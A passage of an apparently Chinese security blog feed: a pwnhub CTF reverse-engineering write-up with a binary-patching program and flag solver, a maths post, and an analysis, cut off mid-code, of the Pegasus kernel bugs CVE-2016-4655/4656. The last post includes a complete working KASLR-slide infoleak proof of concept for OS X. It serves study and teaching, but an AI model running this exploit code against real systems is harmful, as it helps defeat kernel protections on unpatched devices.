    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/</id>
    <published>2017-05-28T01:16:13.000Z</published>
    <updated>2019-02-21T10:03:11.419Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在<a href="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/re150?raw=true">这里</a></p><h2 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h2><p>拿到题目后试着在虚拟机里运行了一下，看下有什么提示<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-0.png?raw=true" alt="0-0"></p><p>然后转去hopper搜下相关字符串，并没有发现<code>error</code>相关字符串，syclover也没有相关<code>printf</code>等函数输出，看来只能上gdb调试看看。</p><p>发现程序里面有多处花指令以及隐藏了程序入口。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-1.png?raw=true" alt="0-0"></p><p>由上图可以发现syclover直接由<code>int 0x80</code>系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。</p><p>由<code>__libc_start_main</code>函数可得第一个参数即为<code>main</code>函数地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-2.png?raw=true" alt="0-0"><br>这里作为对比，可以看下hopper中对<code>0x8048320</code>main函数的解析<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-3.png?raw=true" alt="0-0"><br>完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索</p><p>接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。</p><h2 id="0x02-修复程序"><a href="#0x02-修复程序" class="headerlink" title="0x02 修复程序"></a>0x02 修复程序</h2><p>根据上面的分析，我们将程序进行修复</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;elf.h&gt;#define ENTRY 0x08048320#define FILE_OFF 0x320#define COUNT 0x432int main(int argc,char *argv[]){    Elf32_Ehdr ehdr;    unsigned char buf[COUNT] = {0};    assert(argc == 2);    int fd = open(argv[1],O_RDWR);//打开文件    assert(fd&gt;0);    assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头    assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));     ehdr.e_entry = ENTRY;//修改入口地址      assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头    assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr));      //解密    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码    assert(read(fd,buf,COUNT) == COUNT);    int i = 0;    while(i&lt;COUNT){        buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3;         i++;         }    assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码    assert(write(fd,buf,COUNT) == COUNT);</code></pre><h2 id="0x03-分析算法计算flag"><a href="#0x03-分析算法计算flag" class="headerlink" title="0x03 分析算法计算flag"></a>0x03 分析算法计算flag</h2><pre><code>#!/usr/bin/python# -*- coding: UTF-8 -*-from __future__ import print_function  import sysdef getflag():    print(&quot;[i]start to encrypt key&quot;)    key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d]    encryptKey = []    print(&quot;encryptKey=[&quot;, end=&quot;&quot;)    for idx in range(len(key)):        encryptKey.append(key[idx] ^ 0x20)        print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;)    print(&quot;]&quot;)      flag = []    print(&quot;[i]find the flag&quot;)    for i in range(len(encryptKey)):        count = 0x00        while(count &lt;= 0x7f):            one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))            two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)))            if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]):                flag.append(count)                break            count = count + 1    print(&quot;flag = &quot;,end=&quot;&quot;)    for i in range(len(flag)):        print(&quot;%c&quot; % flag[i], end=&quot;&quot;)   if __name__ == &#39;__main__&#39;:    key = getflag()</code></pre><p>最后运行程序得到flag</p><pre><code>[i]start to encrypt keyencryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ][i]find the flagflag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot}</code></pre><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-4.png?raw=true" alt="0-0"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度
      
    
    </summary>
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"/>
    
      <category term="writeup" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>一道高中数学题的思考？</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/</id>
    <published>2017-05-04T12:37:59.000Z</published>
    <updated>2019-02-21T10:01:58.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 突然在邮件中收到Quora中这样一个问题”What does X equal in $\sqrt{x+15} + \sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。</p></blockquote><h2 id="0x01-你会怎么解决？"><a href="#0x01-你会怎么解决？" class="headerlink" title="0x01 你会怎么解决？"></a>0x01 你会怎么解决？</h2><p>不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。</p><h2 id="0x02-方法1-平方法"><a href="#0x02-方法1-平方法" class="headerlink" title="0x02 方法1 平方法"></a>0x02 方法1 平方法</h2><p>通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根</p><p>$\sqrt{x+15} + \sqrt{x} = 15$ </p><p>$(\sqrt{x+15} + \sqrt{x})^2 = 15^2$ </p><p>$x+15 + 2\sqrt{(x+15)x} + x = 225$ </p><p>$2\sqrt{(x+15)x} = 210 - 2x$  </p><p>$\sqrt{(x+15)x} = 105 - x$  </p><p>$(\sqrt{(x+15)x})^2 = (105 - x)^2$  </p><p>$x^2 + 15x = 11025 - 210x +x^2$  </p><p>$225x = 11025$  </p><p>$ x = 49$<br>思维过程很清楚，但明显计算上有点繁琐。  </p><h2 id="0x03-方法2-拼凑法"><a href="#0x03-方法2-拼凑法" class="headerlink" title="0x03 方法2 拼凑法"></a>0x03 方法2 拼凑法</h2><p>不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$）</p><p>哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。  </p><p>$\sqrt{49 + 15} + \sqrt{49} = 15$  </p><p>$7 + 8 = 15$<br>最快，但不一定可靠。</p><h2 id="0x04-方法3-平方差法"><a href="#0x04-方法3-平方差法" class="headerlink" title="0x04 方法3 平方差法"></a>0x04 方法3 平方差法</h2><p>暂且称作平方差法吧，这个方法是我最推荐的，既快又准。<br>原式：$\sqrt{x+15} + \sqrt{x} = 15$  (1)</p><p>设 $\sqrt{x+15} - \sqrt{x} = k$  </p><p>又 $(\sqrt{x+15} - \sqrt{x})(\sqrt{x+15} + \sqrt{x})= 15k$ </p><p>解得： $k = 1$    </p><p>所以 $\sqrt{x+15} - \sqrt{x} = 1$ （2）</p><p>然后<code>（1）+ (2)</code>:   $2\sqrt{x+15} = 16$  </p><p>解得: $x = 49$  </p><p>多么棒的一个方法 I love it！  </p><h2 id="0x05-我与数学"><a href="#0x05-我与数学" class="headerlink" title="0x05 我与数学"></a>0x05 我与数学</h2><p>从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步<a href="https://www.zhihu.com/question/30050677" target="_blank" rel="external">高考数学数列放缩总结技巧有哪些？</a><br>相信不管是现在还是将来，数学都是我最深处的支持。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 突然在邮件中收到Quora中这样一个问题”What do
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="math" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/math/"/>
    
  </entry>
  
  <entry>
    <title>Pegasus内核漏洞及PoC分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/</id>
    <published>2017-05-01T06:52:45.000Z</published>
    <updated>2019-02-21T10:03:02.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X<br> 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google<br> 1.<a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOS“远程越狱”间谍软件Pegasus技术分析</a><br> 2.<a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOS三叉戟漏洞补丁分析、利用代码 公布（POC</a><br> 3.<a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus – 针对iOS设备的APT攻击分析</a></p></blockquote><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><ol><li><code>OSUnserializeBinary</code>概述</li><li>漏洞分析-CVE-2016-4655，CVE-2016-4656</li><li>漏洞利用-PoC分析</li><li>总结</li></ol><h2 id="0x02-OSUnserializeBinary概述"><a href="#0x02-OSUnserializeBinary概述" class="headerlink" title="0x02 OSUnserializeBinary概述"></a>0x02 <code>OSUnserializeBinary</code>概述</h2><ol><li><p>序列化与反序列化<br>在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。<br>在XNU内核也有一个实现，<code>OSUnserializeXML</code>(将xml格式转化为内核数据对象)和<code>OSUnserializeBinary</code>(将二进制格式转化为内核数据对象)</p></li><li><p><code>OSUnserializeBinary</code>的二进制格式<br><code>OSUnserializeBinary</code>这个函数将连续的二进制流分成<code>uint32_t</code>32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下  </p></li></ol><pre><code class="C">#define kOSSerializeBinarySignature &quot;\323\0\0&quot; /* 0x000000d3 */enum {    kOSSerializeDictionary      = 0x01000000U,    kOSSerializeArray           = 0x02000000U,    kOSSerializeSet             = 0x03000000U,    kOSSerializeNumber          = 0x04000000U,    kOSSerializeSymbol          = 0x08000000U,    kOSSerializeString          = 0x09000000U,    kOSSerializeData            = 0x0a000000U,    kOSSerializeBoolean         = 0x0b000000U,    kOSSerializeObject          = 0x0c000000U,    kOSSerializeTypeMask        = 0x7F000000U,    kOSSerializeDataMask        = 0x00FFFFFFU,    kOSSerializeEndCollection   = 0x80000000U,};</code></pre><p>这里的<code>0x000000d3</code>代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。<code>kOSSerializeTypeMask</code>和<code>kOSSerializeDataMask</code>分别为类型和数据大小掩码。<code>kOSSerializeEndCollection</code>代表当前集合(dic，array或set)是否结束。<br>可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。</p><table><thead><tr><th>当前集合是否结束</th><th>当前数据类型</th><th>当前元素长度</th></tr></thead><tbody><tr><td>0</td><td>0000000</td><td>000000000000000000000000</td></tr></tbody></table><p>例如下面的二进制数据</p><pre><code class="C">0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001</code></pre><p>则对应：</p><pre><code class="C">&lt;dict&gt;    &lt;string&gt;AAAA&lt;/string&gt;  //键key    &lt;boolean&gt;1&lt;/boolean&gt;  //值value&lt;/dict&gt;</code></pre><p>这样的数据结构。对应过程也很简单，<code>0x000000d3</code>标志为合法的签名，<code>0x81000000</code>为dic类型且为最后一个元素，<code>0x09000004</code>为4字节大小的字符串，<code>0x8b000001</code>为bool型，所以只需用最后一位代表true或false</p><ol><li><code>OSUnserializeBinary()</code>分析<br>完整源代码见文末，下面将对其中几个重要的地方分别做分析说明  </li></ol><pre><code>    while (ok)    {        bufferPos += sizeof(*next);        if (!(ok = (bufferPos &lt;= bufferSize))) break;        key = *next++;        len = (key &amp; kOSSerializeDataMask);        wordLen = (len + 3) &gt;&gt; 2;        end = (0 != (kOSSerializeEndCollecton &amp; key));        newCollect = isRef = false;        o = 0; newDict = 0; newArray = 0; newSet = 0;        switch (kOSSerializeTypeMask &amp; key)        {            case kOSSerializeDictionary:            ...            case kOSSerializeArray:            ...            case kOSSerializeSet:            ...            case kOSSerializeObject:            ...            case kOSSerializeNumber:            ...            case kOSSerializeSymbol:            ...            case kOSSerializeString:            ...            case kOSSerializeData:            ...            case kOSSerializeBoolean:            ...            default:                break;        }        ...</code></pre><p>进行一些初始化和检查后就进入<code>while(ok)</code>循环，并且是以32位的整数位单位遍历循环，读取当前的整数<code>key</code>，确定其长度<code>len</code>，当前集合31位是否设置<code>end</code>。并通过类型掩码<code>kOSSerializeTypeMask</code>确定其<code>key</code>的类型从而进入不同的case。例如我们看<code>kOSSerializeDictionary</code>例子  </p><pre><code>case kOSSerializeDictionary:    o = newDict = OSDictionary::withCapacity(len);    newCollect = (len != 0);    break;</code></pre><p>o为指向当前反序列化对象的指针，在每种case中被指定  </p><pre><code>case kOSSerializeData:    bufferPos += (wordLen * sizeof(uint32_t));    if (bufferPos &gt; bufferSize) break;    o = OSData::withBytes(next, len);    next += wordLen;    break;</code></pre><p>这里当遇到一个为<code>kOSSerializeData</code>类型时，根据其<code>len</code>找到其数据并将其存储在<code>OSData</code>数据结构中，并移动<code>next</code>。其他的case都做类似对应的处理。<br>跳出switch  </p><pre><code>if (!(ok = (o != 0))) break;</code></pre><p>因为每一次循环都会进入<code>case</code>并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。  </p><pre><code>if (!isRef){    setAtIndex(objs, objsIdx, o);    if (!ok) break;    objsIdx++;}</code></pre><p>这里很重要将与后面的漏洞相关，首先判断<code>isRef</code>是否被设置。</p><pre><code> case kOSSerializeObject:                if (len &gt;= objsIdx) break;                o = objsArray[len];                o-&gt;retain();                isRef = true;                break;</code></pre><p><code>isRef</code>只有当当前的类型为<code>kOSSerializeObject</code>即引用类型是才被设为<code>true</code>，这里引用的意思则表示当前指向<code>dic</code>中其他数据，其值为对应下标。<br>回到前面那里，下面重点关注<code>setAtIndex</code>这个宏定义</p><pre><code class="js">#define setAtIndex(v, idx, o)                                                           \    if (idx &gt;= v##Capacity)                                                            \    {                                                                                   \        uint32_t ncap = v##Capacity + 64;                                               \        typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));  \        if (!nbuf) ok = false;                                                          \        if (v##Array)                                                                   \        {                                                                               \            bcopy(v##Array, nbuf, v##Capacity * sizeof(o));                             \            kfree(v##Array, v##Capacity * sizeof(o));                                   \        }                                                                               \        v##Array    = nbuf;                                                             \        v##Capacity = ncap;                                                             \    }                                                                                   \    if (ok) v##Array[idx] = o;</code></pre><p>看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到<code>objs</code>数组中对应的位置。</p><pre><code class="C">if (dict){        if (sym)        {            if (o != dict) ok = dict-&gt;setObject(sym, o, true);            o-&gt;release();            sym-&gt;release();            sym = 0;        }        else        {            sym = OSDynamicCast(OSSymbol, o);            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))            {                sym = (OSSymbol *) OSSymbol::withString(str);                o-&gt;release();                o = 0;            }            ok = (sym != 0);        }    }    else if (array)    {        ok = array-&gt;setObject(o);        o-&gt;release();    }    else if (set)    {        ok = set-&gt;setObject(o);       o-&gt;release();   }    else    {        assert(!parent);        result = o;    }</code></pre><p>对解析出来的当前的集合做对应处理，比如这里的如果<code>dic</code>为真，因为<code>dic</code>字典数据结构需要<code>key-&gt;value</code>键值对的形式，所以先判断<code>sym</code>，若没设置，则代表当前<code>o</code>对象为key，则将其转化为<code>OSSymbol</code>类型，设置<code>sym</code>为true并将<code>o</code>free，那么下一次的<code>o</code>代表的对象一定是值，然后就将<code>sym</code>和<code>o</code>以键值对的形式存储在<code>dic</code>字典中，如此交替。<br>后面的代码对漏洞来说不是很重要了  </p><pre><code>if (newCollect){        if (!end)            {                stackIdx++;                setAtIndex(stack, stackIdx, parent);                if (!ok) break;            }            DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);            parent = o;            dict   = newDict;            array  = newArray;            set    = newSet;            end    = false;        }        if (end)        {            if (!stackIdx) break;            parent = stackArray[stackIdx];            DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);            stackIdx--;            set   = 0;             dict  = 0;             array = 0;            if (!(dict = OSDynamicCast(OSDictionary, parent)))            {                if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));            }        }</code></pre><p>简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当<code>end</code>时就将整个新集合放入之前的<code>dic</code>。</p><h2 id="0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656"><a href="#0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656" class="headerlink" title="0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656"></a>0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656</h2><p>这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞</p><h3 id="CVE-2016-4655-infoleak"><a href="#CVE-2016-4655-infoleak" class="headerlink" title="CVE-2016-4655-infoleak"></a>CVE-2016-4655-infoleak</h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p><p>下面看漏洞点，回顾之前<code>kOSSerializeNumber</code>这个case内容</p><pre><code>case kOSSerializeNumber:    bufferPos += sizeof(long long);    if (bufferPos &gt; bufferSize) break;    value = next[1];    value &lt;&lt;= 32;    value |= next[0];    o = OSNumber::withNumber(value, len);    next += 2;    break;</code></pre><p>这里存在什么问题呢？这里没有检查<code>OSNumber</code>的长度，也就是说我们可以创建一个任意长度的<code>OSNumber</code>，进而在内核读取的时候越界，然后泄漏内核地址信息。</p><h3 id="CVE-2016-4656-UAF漏洞"><a href="#CVE-2016-4656-UAF漏洞" class="headerlink" title="CVE-2016-4656-UAF漏洞"></a>CVE-2016-4656-UAF漏洞</h3><p>UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。<br>来看下漏洞点，下面的代码是序列化字典dic将<code>OSString</code>这个键转化为<code>OSSymbol</code>，见下</p><pre><code class="C">if (dict){        if (sym)        {            ...        }        else        {            sym = OSDynamicCast(OSSymbol, o);            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))            {                sym = (OSSymbol *) OSSymbol::withString(str);                o-&gt;release();                o = 0;            }            ok = (sym != 0);        }    }</code></pre><p>这里<code>o-&gt;release()</code>有什么问题呢?还记得<code>objsArray</code>吧，用来存储所有的对象，但是用<code>setAtIndex</code>这个宏来将所有的对象<code>o</code>存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面<code>kOSSerializeObject</code>中的<code>switchcase</code>。 </p><pre><code>case kOSSerializeObject:    if (len &gt;= objsIdx) break;    o = objsArray[len];    o-&gt;retain();    isRef = true;    break;</code></pre><p>此时之前存储在之前的<code>objsArray</code>的<code>OSString</code>已经free，而 <code>o = objsArray[len]; o-&gt;retain();</code>由对其进行了<code>retain</code>引用，好的一个完美的UAF漏洞。<br>所以我们可以构造一个字典<code>dic</code>，其中<code>OSString</code>包含一些配对的值，然后序列化一个<code>kOSSerializeObject</code>引用对象，<code>OSString</code>将调用<code>retain</code>，但却是一个被释放的对象。  </p><h2 id="0x04-漏洞利用-PoC分析"><a href="#0x04-漏洞利用-PoC分析" class="headerlink" title="0x04 漏洞利用-PoC分析"></a>0x04 漏洞利用-PoC分析</h2><p>同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</p><h3 id="CVE-2016-4655-infoleak漏洞利用"><a href="#CVE-2016-4655-infoleak漏洞利用" class="headerlink" title="CVE-2016-4655-infoleak漏洞利用"></a>CVE-2016-4655-infoleak漏洞利用</h3><p>infoleak漏洞利用步骤：</p><ul><li>构造一个包含过长的<code>OSNumber</code>dic字典</li><li>用这个序列化字典去设置userclient对象的属性</li><li>读回设置的<code>OSNumber</code>属性，造成infoleak</li><li>利用读取回来的内核地址信息计算KASLR    </li></ul><p>完整的代码。</p><pre><code>uint64_t kslide_infoleak(void){    kern_return_t kr = 0, err = 0;    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;    io_service_t serv = 0;    io_connect_t conn = 0;    io_iterator_t iter = 0;    uint64_t kslide = 0;    void *dict = calloc(1, 512);    uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte    WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key + NUL byte in little-endian    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number    WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);    if (kr == KERN_SUCCESS) {        printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);    } else        return -1;    serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);    if (kr == KERN_SUCCESS) {        printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);    } else        return -1;    IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);    io_object_t object = IOIteratorNext(iter);    char buf[0x200] = {0};    mach_msg_type_number_t bufCnt = 0x200;    kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);    if (kr == KERN_SUCCESS) {        printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);    } else        return -1;#if 0    for (uint32_t k = 0; k &lt; 128; k += 8) {        printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));    }#endif    uint64_t hardcoded_ret_addr = 0xffffff80003934bf;    kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;    printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);    return kslide;}</code></pre><h4 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h4><p>看下面这段代码</p><pre><code>void *dict = calloc(1, 512);uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)</code></pre><p>这里的<code>WRITE_IN</code>这个宏只是为了方便我们将数据填入内存之中  </p><p>xml的字典格式  </p><pre><code>&lt;dict&gt;    &lt;symbol&gt;AAA&lt;/symbol&gt;    &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt;&lt;/dict&gt;</code></pre><p>对应的代码  </p><pre><code>WRITE_IN(dict, (0x000000d3)); // 头部签名WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbolWRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key键WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的numberWRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number</code></pre><p>利用<code>io_service_get_matching_services_bin</code>测试我们的<code>dic</code>是否有效  </p><pre><code>host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr == KERN_SUCCESS) {    printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);} else    return -1;</code></pre><p>若<code>kr == KERN_SUCCESS</code>则我们的<code>dic</code>则为有效</p><h4 id="生成UserClient设定属性"><a href="#生成UserClient设定属性" class="headerlink" title="生成UserClient设定属性"></a>生成UserClient设定属性</h4><p>我们需要一个<code>UserClient</code>用来和内核通信，所以使用<code>io_service_open_extended</code>来产生一个相关服务的<code>UserClient</code>，这里的服务并不重要  </p><pre><code>serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);if (kr == KERN_SUCCESS) {    printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);} else    return -1;</code></pre><p>首先我们通过<code>IOServiceGetMatchingService</code>去从<code>IORegistry</code>里匹配一个特定服务，然后通过<code>io_service_open_extended</code>让可以设置其属性并打开一个服务即隐式产生<code>UserClient</code><br>接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代<code>IORegistry</code>找到刚刚创建的<code>UserClient</code>。  </p><pre><code>IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);io_object_t object = IOIteratorNext(iter);</code></pre><p>先通过<code>serv</code>端口创建<code>io_iterator_t</code>，我们的<code>UserClient</code>在<code>serv</code>创建之后，所以拿到<code>iter</code>后迭代一次即为我们的<code>UserClient</code>，现在就可以读取其属性并触发info-leak。</p><h4 id="读取属性，触发info-leak"><a href="#读取属性，触发info-leak" class="headerlink" title="读取属性，触发info-leak"></a>读取属性，触发info-leak</h4><pre><code>char buf[0x200] = {0};mach_msg_type_number_t bufCnt = 0x200;kr = io_registry_entry_get_property_bytes(object, 